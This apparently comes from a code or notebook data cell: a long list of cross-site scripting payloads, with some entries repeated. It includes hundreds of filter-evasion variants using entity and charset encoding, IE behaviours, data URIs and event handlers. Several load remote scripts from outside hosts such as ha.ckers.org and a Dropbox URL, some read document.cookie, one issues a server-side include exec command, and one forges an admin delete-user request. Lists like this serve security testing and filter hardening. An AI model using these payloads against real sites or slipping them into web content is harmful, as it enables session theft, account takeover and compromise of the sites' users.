       " '<script>({set/**/$($){_/**/setter=$,_=javascript:alert(1)}}).$=eval</script>',\n",
       " '<script>({0:#0=eval/#0#/#0#(javascript:alert(1))})</script>',\n",
       " \"<script>ReferenceError.prototype.__defineGetter__('name', function(){javascript:alert(1)}),x</script>\",\n",
       " \"<script>Object.__noSuchMethod__ = Function,[{}][0].constructor._('javascript:alert(1)')()</script>\",\n",
       " '<meta charset=\"x-imap4-modified-utf7\">&ADz&AGn&AG0&AEf&ACA&AHM&AHI&AGO&AD0&AGn&ACA&AG8Abg&AGUAcgByAG8AcgA9AGEAbABlAHIAdAAoADEAKQ&ACAAPABi',\n",
       " '<meta charset=\"x-imap4-modified-utf7\">&<script&S1&TS&1>alert&A7&(1)&R&UA;&&<&A9&11/script&X&>',\n",
       " '<meta charset=\"mac-farsi\">¼script¾javascript:alert(1)¼/script¾',\n",
       " 'X<x style=`behavior:url(#default#time2)` onbegin=`javascript:alert(1)` >',\n",
       " '1<set/xmlns=`urn:schemas-microsoft-com:time` style=`beh&#x41vior:url(#default#time2)` attributename=`innerhtml` to=`&lt;img/src=&quot;x&quot;onerror=javascript:alert(1)&gt;`>',\n",
       " '1<animate/xmlns=urn:schemas-microsoft-com:time style=behavior:url(#default#time2) attributename=innerhtml values=&lt;img/src=&quot;.&quot;onerror=javascript:alert(1)&gt;>',\n",
       " '<vmlframe xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute;width:100%;height:100% src=%(vml)s#xss></vmlframe>',\n",
       " '1<a href=#><line xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute href=javascript:javascript:alert(1) strokecolor=white strokeweight=1000px from=0 to=1000 /></a>',\n",
       " '<a style=\"behavior:url(#default#AnchorClick);\" folder=\"javascript:javascript:alert(1)\">XXX</a>',\n",
       " '<x style=\"behavior:url(%(sct)s)\">',\n",
       " '<xml id=\"xss\" src=\"%(htc)s\"></xml> <label dataformatas=\"html\" datasrc=\"#xss\" datafld=\"payload\"></label>',\n",
       " '<event-source src=\"%(event)s\" onload=\"javascript:alert(1)\">',\n",
       " '<a href=\"javascript:javascript:alert(1)\"><event-source src=\"data:application/x-dom-event-stream,Event:click%0Adata:XXX%0A%0A\">',\n",
       " '<script>%(payload)s</script>',\n",
       " '<script src=%(jscript)s></script>',\n",
       " \"<script language='javascript' src='%(jscript)s'></script>\",\n",
       " '<script>javascript:alert(1)</script>',\n",
       " '<IMG SRC=\"javascript:javascript:alert(1);\">',\n",
       " '<IMG SRC=javascript:javascript:alert(1)>',\n",
       " '<IMG SRC=`javascript:javascript:alert(1)`>',\n",
       " '<SCRIPT SRC=%(jscript)s?<B>',\n",
       " '<FRAMESET><FRAME SRC=\"javascript:javascript:alert(1);\"></FRAMESET>',\n",
       " '<BODY ONLOAD=javascript:alert(1)>',\n",
       " '<BODY ONLOAD=javascript:javascript:alert(1)>',\n",
       " '<IMG SRC=\"jav    ascript:javascript:alert(1);\">',\n",
       " '<BODY onload!#$%%&()*~+-_.,:;?@[/|\\\\]^`=javascript:alert(1)>',\n",
       " '<SCRIPT/SRC=\"%(jscript)s\"></SCRIPT>',\n",
       " '<<SCRIPT>%(payload)s//<</SCRIPT>',\n",
       " '<IMG SRC=\"javascript:javascript:alert(1)\"',\n",
       " '<iframe src=%(scriptlet)s <',\n",
       " '<INPUT TYPE=\"IMAGE\" SRC=\"javascript:javascript:alert(1);\">',\n",
       " '<IMG DYNSRC=\"javascript:javascript:alert(1)\">',\n",
       " '<IMG LOWSRC=\"javascript:javascript:alert(1)\">',\n",
       " '<BGSOUND SRC=\"javascript:javascript:alert(1);\">',\n",
       " '<BR SIZE=\"&{javascript:alert(1)}\">',\n",
       " '<LAYER SRC=\"%(scriptlet)s\"></LAYER>',\n",
       " '<LINK REL=\"stylesheet\" HREF=\"javascript:javascript:alert(1);\">',\n",
       " \"<STYLE>@import'%(css)s';</STYLE>\",\n",
       " '<META HTTP-EQUIV=\"Link\" Content=\"<%(css)s>; REL=stylesheet\">',\n",
       " '<XSS STYLE=\"behavior: url(%(htc)s);\">',\n",
       " '<STYLE>li {list-style-image: url(\"javascript:javascript:alert(1)\");}</STYLE><UL><LI>XSS',\n",
       " '<META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=javascript:javascript:alert(1);\">',\n",
       " '<META HTTP-EQUIV=\"refresh\" CONTENT=\"0; URL=http://;URL=javascript:javascript:alert(1);\">',\n",
       " '<IFRAME SRC=\"javascript:javascript:alert(1);\"></IFRAME>',\n",
       " '<TABLE BACKGROUND=\"javascript:javascript:alert(1)\">',\n",
       " '<TABLE><TD BACKGROUND=\"javascript:javascript:alert(1)\">',\n",
       " '<DIV STYLE=\"background-image: url(javascript:javascript:alert(1))\">',\n",
       " '<DIV STYLE=\"width:expression(javascript:alert(1));\">',\n",
       " '<IMG STYLE=\"xss:expr/*XSS*/ession(javascript:alert(1))\">',\n",
       " '<XSS STYLE=\"xss:expression(javascript:alert(1))\">',\n",
       " '<STYLE TYPE=\"text/javascript\">javascript:alert(1);</STYLE>',\n",
       " '<STYLE>.XSS{background-image:url(\"javascript:javascript:alert(1)\");}</STYLE><A CLASS=XSS></A>',\n",
       " '<STYLE type=\"text/css\">BODY{background:url(\"javascript:javascript:alert(1)\")}</STYLE>',\n",
       " '<!--[if gte IE 4]><SCRIPT>javascript:alert(1);</SCRIPT><![endif]-->',\n",
       " '<BASE HREF=\"javascript:javascript:alert(1);//\">',\n",
       " '<OBJECT TYPE=\"text/x-scriptlet\" DATA=\"%(scriptlet)s\"></OBJECT>',\n",
       " '<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:javascript:alert(1)></OBJECT>',\n",
       " '<SCRIPT SRC=\"%(jpg)s\"></SCRIPT>',\n",
       " '<HEAD><META HTTP-EQUIV=\"CONTENT-TYPE\" CONTENT=\"text/html; charset=UTF-7\"> </HEAD>+ADw-SCRIPT+AD4-%(payload)s;+ADw-/SCRIPT+AD4-',\n",
       " '<form id=\"test\" /><button form=\"test\" formaction=\"javascript:javascript:alert(1)\">X',\n",
       " '<P STYLE=\"behavior:url(\\'#default#time2\\')\" end=\"0\" onEnd=\"javascript:alert(1)\">',\n",
       " \"<STYLE>@import'%(css)s';</STYLE>\",\n",
       " \"<STYLE>a{background:url('s1' 's2)}@import javascript:javascript:alert(1);');}</STYLE>\",\n",
       " '<meta charset= \"x-imap4-modified-utf7\"&&>&&<script&&>javascript:alert(1)&&;&&<&&/script&&>',\n",
       " '<SCRIPT onreadystatechange=javascript:javascript:alert(1);></SCRIPT>',\n",
       " '<style onreadystatechange=javascript:javascript:alert(1);></style>',\n",
       " '<?xml version=\"1.0\"?><html:html xmlns:html=\\'http://www.w3.org/1999/xhtml\\'><html:script>javascript:alert(1);</html:script></html:html>',\n",
       " '<embed code=%(scriptlet)s></embed>',\n",
       " '<embed code=javascript:javascript:alert(1);></embed>',\n",
       " '<embed src=%(jscript)s></embed>',\n",
       " '<frameset onload=javascript:javascript:alert(1)></frameset>',\n",
       " '<object onerror=javascript:javascript:alert(1)>',\n",
       " '<embed type=\"image\" src=%(scriptlet)s></embed>',\n",
       " '<XML ID=I><X><C><![CDATA[<IMG SRC=\"javas]]<![CDATA[cript:javascript:alert(1);\">]]</C><X></xml>',\n",
       " '<IMG SRC=&{javascript:alert(1);};>',\n",
       " '<a href=\"jav&#65ascript:javascript:alert(1)\">test1</a>',\n",
       " '<a href=\"jav&#97ascript:javascript:alert(1)\">test1</a>',\n",
       " '<embed width=500 height=500 code=\"data:text/html,<script>%(payload)s</script>\"></embed>',\n",
       " '<iframe srcdoc=\"&LT;iframe&sol;srcdoc=&amp;lt;img&sol;src=&amp;apos;&amp;apos;onerror=javascript:alert(1)&amp;gt;>\">',\n",
       " '\\';alert(String.fromCharCode(88,83,83))//\\';alert(String.fromCharCode(88,83,83))//\";',\n",
       " 'alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--',\n",
       " '></SCRIPT>\">\\'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>',\n",
       " '\\'\\';!--\"<XSS>=&{()}',\n",
       " '<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>',\n",
       " '<IMG SRC=\"javascript:alert(\\'XSS\\');\">',\n",
       " \"<IMG SRC=javascript:alert('XSS')>\",\n",
       " \"<IMG SRC=JaVaScRiPt:alert('XSS')>\",\n",
       " '<IMG SRC=javascript:alert(\"XSS\")>',\n",
       " '<IMG SRC=`javascript:alert(\"RSnake says, \\'XSS\\'\")`>',\n",
       " '<a onmouseover=\"alert(document.cookie)\">xxs link</a>',\n",
       " '<a onmouseover=alert(document.cookie)>xxs link</a>',\n",
       " '<IMG \"\"\"><SCRIPT>alert(\"XSS\")</SCRIPT>\">',\n",
       " '<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>',\n",
       " '<IMG SRC=# onmouseover=\"alert(\\'xxs\\')\">',\n",
       " '<IMG SRC= onmouseover=\"alert(\\'xxs\\')\">',\n",
       " '<IMG onmouseover=\"alert(\\'xxs\\')\">',\n",
       " '<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>',\n",
       " '<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>',\n",
       " '<IMG SRC=\"jav\\tascript:alert(\\'XSS\\');\">',\n",
       " '<IMG SRC=\"jav&#x09;ascript:alert(\\'XSS\\');\">',\n",
       " '<IMG SRC=\"jav&#x0A;ascript:alert(\\'XSS\\');\">',\n",
       " '<IMG SRC=\"jav&#x0D;ascript:alert(\\'XSS\\');\">',\n",
       " 'perl -e \\'print \"<IMG SRC=java\\\\0script:alert(\\\\\"XSS\\\\\")>\";\\' > out',\n",
       " '<IMG SRC=\" &#14;  javascript:alert(\\'XSS\\');\">',\n",
       " '<SCRIPT/XSS SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>',\n",
       " '<BODY onload!#$%&()*~+-_.,:;?@[/|\\\\]^`=alert(\"XSS\")>',\n",
       " '<SCRIPT/SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>',\n",
       " '<<SCRIPT>alert(\"XSS\");//<</SCRIPT>',\n",
       " '<SCRIPT SRC=http://ha.ckers.org/xss.js?< B >',\n",
       " '<SCRIPT SRC=//ha.ckers.org/.j>',\n",
       " '<IMG SRC=\"javascript:alert(\\'XSS\\')\"',\n",
       " '<iframe src=http://ha.ckers.org/scriptlet.html <',\n",
       " '\\\\\";alert(\\'XSS\\');//',\n",
       " '</TITLE><SCRIPT>alert(\"XSS\");</SCRIPT>',\n",
       " '<INPUT TYPE=\"IMAGE\" SRC=\"javascript:alert(\\'XSS\\');\">',\n",
       " '<BODY BACKGROUND=\"javascript:alert(\\'XSS\\')\">',\n",
       " '<IMG DYNSRC=\"javascript:alert(\\'XSS\\')\">',\n",
       " '<IMG LOWSRC=\"javascript:alert(\\'XSS\\')\">',\n",
       " '<STYLE>li {list-style-image: url(\"javascript:alert(\\'XSS\\')\");}</STYLE><UL><LI>XSS</br>',\n",
       " '<IMG SRC=\\'vbscript:msgbox(\"XSS\")\\'>',\n",
       " '<IMG SRC=\"livescript:[code]\">',\n",
       " \"<BODY ONLOAD=alert('XSS')>\",\n",
       " '<BGSOUND SRC=\"javascript:alert(\\'XSS\\');\">',\n",
       " '<BR SIZE=\"&{alert(\\'XSS\\')}\">',\n",
       " '<LINK REL=\"stylesheet\" HREF=\"javascript:alert(\\'XSS\\');\">',\n",
       " '<LINK REL=\"stylesheet\" HREF=\"http://ha.ckers.org/xss.css\">',\n",
       " \"<STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>\",\n",
       " '<META HTTP-EQUIV=\"Link\" Content=\"<http://ha.ckers.org/xss.css>; REL=stylesheet\">',\n",
       " '<STYLE>BODY{-moz-binding:url(\"http://ha.ckers.org/xssmoz.xml#xss\")}</STYLE>',\n",
       " '<STYLE>@im\\\\port\\'\\\\ja\\\\vasc\\\\ript:alert(\"XSS\")\\';</STYLE>',\n",
       " '<IMG STYLE=\"xss:expr/*XSS*/ession(alert(\\'XSS\\'))\">',\n",
       " 'exp/*<A STYLE=\\'no\\\\xss:noxss(\"*//*\");xss:ex/*XSS*//*/*/pression(alert(\"XSS\"))\\'>',\n",
       " '<STYLE TYPE=\"text/javascript\">alert(\\'XSS\\');</STYLE>',\n",
       " '<STYLE>.XSS{background-image:url(\"javascript:alert(\\'XSS\\')\");}</STYLE><A CLASS=XSS></A>',\n",
       " '<STYLE type=\"text/css\">BODY{background:url(\"javascript:alert(\\'XSS\\')\")}</STYLE>',\n",
       " '<STYLE type=\"text/css\">BODY{background:url(\"javascript:alert(\\'XSS\\')\")}</STYLE>',\n",
       " '<XSS STYLE=\"xss:expression(alert(\\'XSS\\'))\">',\n",
       " '<XSS STYLE=\"behavior: url(xss.htc);\">',\n",
       " '¼script¾alert(¢XSS¢)¼/script¾',\n",
       " '<META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=javascript:alert(\\'XSS\\');\">',\n",
       " '<META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K\">',\n",
       " '<META HTTP-EQUIV=\"refresh\" CONTENT=\"0; URL=http://;URL=javascript:alert(\\'XSS\\');\">',\n",
       " '<IFRAME SRC=\"javascript:alert(\\'XSS\\');\"></IFRAME>',\n",
       " '<IFRAME SRC=# onmouseover=\"alert(document.cookie)\"></IFRAME>',\n",
       " '<FRAMESET><FRAME SRC=\"javascript:alert(\\'XSS\\');\"></FRAMESET>',\n",
       " '<TABLE BACKGROUND=\"javascript:alert(\\'XSS\\')\">',\n",
       " '<TABLE><TD BACKGROUND=\"javascript:alert(\\'XSS\\')\">',\n",
       " '<DIV STYLE=\"background-image: url(javascript:alert(\\'XSS\\'))\">',\n",
       " '<DIV STYLE=\"background-image:\\\\0075\\\\0072\\\\006C\\\\0028\\'\\\\006a\\\\0061\\\\0076\\\\0061\\\\0073\\\\0063\\\\0072\\\\0069\\\\0070\\\\0074\\\\003a\\\\0061\\\\006c\\\\0065\\\\0072\\\\0074\\\\0028.1027\\\\0058.1053\\\\0053\\\\0027\\\\0029\\'\\\\0029\">',\n",
       " '<DIV STYLE=\"background-image: url(&#1;javascript:alert(\\'XSS\\'))\">',\n",
       " '<DIV STYLE=\"width: expression(alert(\\'XSS\\'));\">',\n",
       " '<BASE HREF=\"javascript:alert(\\'XSS\\');//\">',\n",
       " '<OBJECT TYPE=\"text/x-scriptlet\" DATA=\"http://ha.ckers.org/scriptlet.html\"></OBJECT>',\n",
       " '<SCRIPT SRC=\"http://ha.ckers.org/xss.jpg\"></SCRIPT>',\n",
       " '<!--#exec cmd=\"/bin/echo \\'<SCR\\'\"--><!--#exec cmd=\"/bin/echo \\'IPT SRC=http://ha.ckers.org/xss.js></SCRIPT>\\'\"-->',\n",
       " '<? echo(\\'<SCR)\\';echo(\\'IPT>alert(\"XSS\")</SCRIPT>\\'); ?>',\n",
       " '<IMG SRC=\"http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode\">',\n",
       " 'Redirect 302 /a.jpg http://victimsite.com/admin.asp&deleteuser',\n",
       " '<META HTTP-EQUIV=\"Set-Cookie\" Content=\"USERID=<SCRIPT>alert(\\'XSS\\')</SCRIPT>\">',\n",
       " '<HEAD><META HTTP-EQUIV=\"CONTENT-TYPE\" CONTENT=\"text/html; charset=UTF-7\"> </HEAD>+ADw-SCRIPT+AD4-alert(\\'XSS\\');+ADw-/SCRIPT+AD4-',\n",
       " '<SCRIPT a=\">\" SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>',\n",
       " '<SCRIPT =\">\" SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>',\n",
       " '<SCRIPT a=\">\" \\'\\' SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>',\n",
       " '<SCRIPT \"a=\\'>\\'\" SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>',\n",
       " '<SCRIPT a=`>` SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>',\n",
       " '<SCRIPT a=\">\\'>\" SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>',\n",
       " '<SCRIPT>document.write(\"<SCRI\");</SCRIPT>PT SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>',\n",
       " '<A HREF=\"http://66.102.7.147/\">XSS</A>',\n",
       " '<A HREF=\"http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D\">XSS</A>',\n",
       " '<A HREF=\"http://1113982867/\">XSS</A>',\n",
       " '<A HREF=\"http://0x42.0x0000066.0x7.0x93/\">XSS</A>',\n",
       " '<A HREF=\"http://0102.0146.0007.00000223/\">XSS</A>',\n",
       " '<A HREF=\"htt\\tp://6\\t6.000146.0x7.147/\">XSS</A>',\n",
       " '<iframe %00 src=\"&Tab;javascript:prompt(1)&Tab;\"%00>',\n",
       " \"<svg><style>{font-family&colon;'<iframe/onload=confirm(1)>'\",\n",
       " '<input/onmouseover=\"javaSCRIPT&colon;confirm&lpar;1&rpar;\"',\n",
       " '<sVg><scRipt %00>alert&lpar;1&rpar; {Opera}',\n",
       " '<img/src=`%00` onerror=this.onerror=confirm(1)',\n",
       " '<form><isindex formaction=\"javascript&colon;confirm(1)\"',\n",
       " '<img src=`%00`&NewLine; onerror=alert(1)&NewLine;',\n",
       " \"<script/&Tab; src='https://dl.dropbox.com/u/13018058/js.js' /&Tab;></script>\",\n",
       " '<ScRipT 5-0*3+9/3=>prompt(1)</ScRipT giveanswerhere=?',\n",
       " '<iframe/src=\"data:text/html;&Tab;base64&Tab;,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg==\">',\n",
       " '<script /*%00*/>/*%00*/alert(1)/*%00*/</script /*%00*/',\n",
       " \"&#34;&#62;<h1/onmouseover='\\\\u0061lert(1)'>%00\",\n",
       " '<iframe/src=\"data:text/html,<svg &#111;&#110;load=alert(1)>\">',\n",
       " '<meta content=\"&NewLine; 1 &NewLine;; JAVASCRIPT&colon; alert(1)\" http-equiv=\"refresh\"/>',\n",
       " \"<svg><script xlink:href=data&colon;,window.open('https://www.google.com/')></script\",\n",
       " \"<svg><script x:href='https://dl.dropbox.com/u/13018058/js.js' {Opera}\",\n",
       " '<meta http-equiv=\"refresh\" content=\"0;url=javascript:confirm(1)\">',\n",
       " '<iframe src=javascript&colon;alert&lpar;document&period;location&rpar;>',\n",
       " '<form><a href=\"javascript:\\\\u0061lert&#x28;1&#x29;\">X',\n",
       " '</script><img/*%00/src=\"worksinchrome&colon;prompt&#x28;1&#x29;\"/%00*/onerror=\\'eval(src)\\'>',\n",
       " '<img/&#09;&#10;&#11; src=`~` onerror=prompt(1)>',\n",
       " '<form><iframe &#09;&#10;&#11; src=\"javascript&#58;alert(1)\"&#11;&#10;&#09;;>',\n",
       " '<a href=\"data:application/x-x509-user-cert;&NewLine;base64&NewLine;,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\"&#09;&#10;&#11;>X</a',\n",
       " 'http://www.google<script .com>alert(document.location)</script',\n",
       " '<a&#32;href&#61;&#91;&#00;&#93;\"&#00; onmouseover=prompt&#40;1&#41;&#47;&#47;\">XYZ</a',\n",
       " \"<img/src=@&#32;&#13; onerror = prompt('&#49;')\",\n",
       " \"<style/onload=prompt&#40;'&#88;&#83;&#83;'&#41;\",\n",
       " '<script ^__^>alert(String.fromCharCode(49))</script ^__^',\n",
       " '</style &#32;><script &#32; :-(>/**/alert(document.location)/**/</script &#32; :-(',\n",
       " '&#00;</form><input type&#61;\"date\" onfocus=\"alert(1)\">',\n",
       " \"<form><textarea &#13; onkeyup='\\\\u0061\\\\u006C\\\\u0065\\\\u0072\\\\u0074&#x28;1&#x29;'>\",\n",
       " \"<script /***/>/***/confirm('\\\\uFF41\\\\uFF4C\\\\uFF45\\\\uFF52\\\\uFF54\\\\u1455\\\\uFF11\\\\u1450')/***/</script /***/\",\n",
       " \"<iframe srcdoc='&lt;body onload=prompt&lpar;1&rpar;&gt;'>\",\n",
       " '<a href=\"javascript:void(0)\" onmouseover=&NewLine;javascript:alert(1)&NewLine;>X</a>',\n",
       " '<script ~~~>alert(0%0)</script ~~~>',\n",
       " '<style/onload=&lt;!--&#09;&gt;&#10;alert&#10;&lpar;1&rpar;>',\n",
       " \"<///style///><span %2F onmousemove='alert&lpar;1&rpar;'>SPAN\",\n",
       " \"<img/src='http://i.imgur.com/P8mL8.jpg' onmouseover=&Tab;prompt(1)\",\n",
       " \"&#34;&#62;<svg><style>{-o-link-source&colon;'<body/onload=confirm(1)>'\",\n",
       " '&#13;<blink/&#13; onmouseover=pr&#x6F;mp&#116;(1)>OnMouseOver {Firefox & Opera}',\n",
       " \"<marquee onstart='javascript:alert&#x28;1&#x29;'>^__^\",\n",
       " '<div/style=\"width:expression(confirm(1))\">X</div> {IE7}',\n",
       " '<iframe/%00/ src=javaSCRIPT&colon;alert(1)',\n",
       " \"//<form/action=javascript&#x3A;alert&lpar;document&period;cookie&rpar;><input/type='submit'>//\",\n",
       " '/*iframe/src*/<iframe/src=\"<iframe/src=@\"/onload=prompt(1) /*iframe/src*/>',\n",
       " \"//|\\\\\\\\ <script //|\\\\\\\\ src='https://dl.dropbox.com/u/13018058/js.js'> //|\\\\\\\\ </script //|\\\\\\\\\",\n",
       " \"</font>/<svg><style>{src&#x3A;'<style/onload=this.onload=confirm(1)>'</font>/</style>\",\n",
       " '<a/href=\"javascript:&#13; javascript:prompt(1)\"><input type=\"X\">',\n",
       " '</plaintext\\\\></|\\\\><plaintext/onmouseover=prompt(1)',\n",
       " \"</svg>''<svg><script 'AQuickBrownFoxJumpsOverTheLazyDog'>alert&#x28;1&#x29; {Opera}\",\n",
       " '<a href=\"javascript&colon;\\\\u0061&#x6C;&#101%72t&lpar;1&rpar;\"><button>',\n",
       " \"<div onmouseover='alert&lpar;1&rpar;'>DIV</div>\",\n",
       " '<iframe style=\"position:absolute;top:0;left:0;width:100%;height:100%\" onmouseover=\"prompt(1)\">',\n",
       " '<a href=\"jAvAsCrIpT&colon;alert&lpar;1&rpar;\">X</a>',\n",
       " '<embed src=\"http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf\">',\n",
       " '<object data=\"http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf\">',\n",
       " '<var onmouseover=\"prompt(1)\">On Mouse Over</var>',\n",
       " '<a href=javascript&colon;alert&lpar;document&period;cookie&rpar;>Click Here</a>',\n",
       " '<img src=\"/\" =_=\" title=\"onerror=\\'prompt(1)\\'\">',\n",
       " \"<%<!--'%><script>alert(1);</script -->\",\n",
       " '<script src=\"data:text/javascript,alert(1)\"></script>',\n",
       " '<iframe/src \\\\/\\\\/onload = prompt(1)',\n",
       " '<iframe/onreadystatechange=alert(1)',\n",
       " '<svg/onload=alert(1)',\n",
       " '<input value=<><iframe/src=javascript:confirm(1)',\n",
       " '<input type=\"text\" value=`` <div/onmouseover=\\'alert(1)\\'>X</div>',\n",
       " 'http://www.<script>alert(1)</script .com',\n",
       " '<svg><script ?>alert(1)',\n",
       " '<iframe src=j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t&Tab;:a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;%28&Tab;1&Tab;%29></iframe>',\n",
       " '<img src=`xx:xx`onerror=alert(1)>',\n",
       " '<object type=\"text/x-scriptlet\" data=\"http://jsfiddle.net/XLE63/ \"></object>',\n",
       " '<meta http-equiv=\"refresh\" content=\"0;javascript&colon;alert(1)\"/>',\n",
       " '<math><a xlink:href=\"//jsfiddle.net/t846h/\">click',\n",
       " '<embed code=\"http://businessinfo.co.uk/labs/xss/xss.swf\" allowscriptaccess=always>',\n",
       " '<svg contentScriptType=text/vbs><script>MsgBox+1',\n",
       " '<a href=\"data:text/html;base64_,<svg/onload=\\\\u0061&#x6C;&#101%72t(1)>\">X</a',\n",
       " \"<iframe/onreadystatechange=\\\\u0061\\\\u006C\\\\u0065\\\\u0072\\\\u0074('\\\\u0061') worksinIE>\",\n",
       " \"<script>~'\\\\u0061' ; \\\\u0074\\\\u0068\\\\u0072\\\\u006F\\\\u0077 ~ \\\\u0074\\\\u0068\\\\u0069\\\\u0073. \\\\u0061\\\\u006C\\\\u0065\\\\u0072\\\\u0074(~'\\\\u0061')</script U+\",\n",
       " '<script/src=\"data&colon;text%2Fj\\\\u0061v\\\\u0061script,\\\\u0061lert(\\'\\\\u0061\\')\"></script a=\\\\u0061 & /=%2F',\n",
       " '<script/src=data&colon;text/j\\\\u0061v\\\\u0061&#115&#99&#114&#105&#112&#116,\\\\u0061%6C%65%72%74(/XSS/)></script',\n",
       " '<object data=javascript&colon;\\\\u0061&#x6C;&#101%72t(1)>',\n",
       " '<script>+-+-1-+-+alert(1)</script>',\n",
       " '<body/onload=&lt;!--&gt;&#10alert(1)>',\n",
       " '<script itworksinallbrowsers>/*<script* */alert(1)</script',\n",
       " '<img src ?itworksonchrome?\\\\/onerror = alert(1)',\n",
       " '<svg><script>//&NewLine;confirm(1);</script </svg>',\n",
       " '<svg><script onlypossibleinopera:-)> alert(1)',\n",
       " '<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&#97v&#97script&#x3A;&#97lert(1)>ClickMe',\n",
       " '<script x> alert(1) </script 1=2',\n",
       " '<div/onmouseover=\\'alert(1)\\'> style=\"x:\">',\n",
       " '<--`<img/src=` onerror=alert(1)> --!>',\n",
       " '<script/src=&#100&#97&#116&#97:text/&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x000070&#x074,&#x0061;&#x06c;&#x0065;&#x00000072;&#x00074;(1)></script>',\n",
       " '<div style=\"position:absolute;top:0;left:0;width:100%;height:100%\" onmouseover=\"prompt(1)\" onclick=\"alert(1)\">x</button>',\n",
       " '\"><img src=x onerror=window.open(\\'https://www.google.com/\\');>',\n",
       " '<form><button formaction=javascript&colon;alert(1)>CLICKME',\n",
       " '<math><a xlink:href=\"//jsfiddle.net/t846h/\">click',\n",
       " '<object data=data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+></object>',\n",
       " '<iframe src=\"data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E\"></iframe>',\n",
       " '‘; alert(1);',\n",
       " '‘)alert(1);//',\n",
       " '<ScRiPt>alert(1)</sCriPt>',\n",
       " '<IMG SRC=jAVasCrIPt:alert(‘XSS’)>',\n",
       " '<IMG SRC=”javascript:alert(‘XSS’);”>',\n",
       " '<IMG SRC=javascript:alert(&quot;XSS&quot;)>',\n",
       " '<IMG SRC=javascript:alert(‘XSS’)>',\n",
       " '<img src=xss onerror=alert(1)>',\n",
       " '<iframe %00 src=\"&Tab;javascript:prompt(1)&Tab;\"%00>',\n",
       " \"<svg><style>{font-family&colon;'<iframe/onload=confirm(1)>'\",\n",
       " '<input/onmouseover=\"javaSCRIPT&colon;confirm&lpar;1&rpar;\"',\n",
       " '<sVg><scRipt %00>alert&lpar;1&rpar; {Opera}',\n",
       " '<img/src=`%00` onerror=this.onerror=confirm(1)',\n",
       " '<form><isindex formaction=\"javascript&colon;confirm(1)\"',\n",
       " '<img src=`%00`&NewLine; onerror=alert(1)&NewLine;',\n",
       " \"<script/&Tab; src='https://dl.dropbox.com/u/13018058/js.js' /&Tab;></script>\",\n",
       " '<ScRipT 5-0*3+9/3=>prompt(1)</ScRipT giveanswerhere=?',\n",
       " '<iframe/src=\"data:text/html;&Tab;base64&Tab;,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg==\">',\n",
       " '<script /*%00*/>/*%00*/alert(1)/*%00*/</script /*%00*/',\n",
       " \"&#34;&#62;<h1/onmouseover='\\\\u0061lert(1)'>%00\",\n",
       " '<iframe/src=\"data:text/html,<svg &#111;&#110;load=alert(1)>\">',\n",
       " '<meta content=\"&NewLine; 1 &NewLine;; JAVASCRIPT&colon; alert(1)\" http-equiv=\"refresh\"/>',\n",
       " \"<svg><script xlink:href=data&colon;,window.open('https://www.google.com/')></script\",\n",
       " \"<svg><script x:href='https://dl.dropbox.com/u/13018058/js.js' {Opera}\",\n",
       " '<meta http-equiv=\"refresh\" content=\"0;url=javascript:confirm(1)\">',\n",
       " '<iframe src=javascript&colon;alert&lpar;document&period;location&rpar;>',\n",
       " '<form><a href=\"javascript:\\\\u0061lert&#x28;1&#x29;\">X',\n",
       " '</script><img/*%00/src=\"worksinchrome&colon;prompt&#x28;1&#x29;\"/%00*/onerror=\\'eval(src)\\'>',\n",
       " '<img/&#09;&#10;&#11; src=`~` onerror=prompt(1)>',\n",
       " '<form><iframe &#09;&#10;&#11; src=\"javascript&#58;alert(1)\"&#11;&#10;&#09;;>',\n",
       " '<a href=\"data:application/x-x509-user-cert;&NewLine;base64&NewLine;,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\"&#09;&#10;&#11;>X</a',\n",
       " 'http://www.google<script .com>alert(document.location)</script',\n",
       " '<a&#32;href&#61;&#91;&#00;&#93;\"&#00; onmouseover=prompt&#40;1&#41;&#47;&#47;\">XYZ</a',\n",
       " \"<img/src=@&#32;&#13; onerror = prompt('&#49;')\",\n",
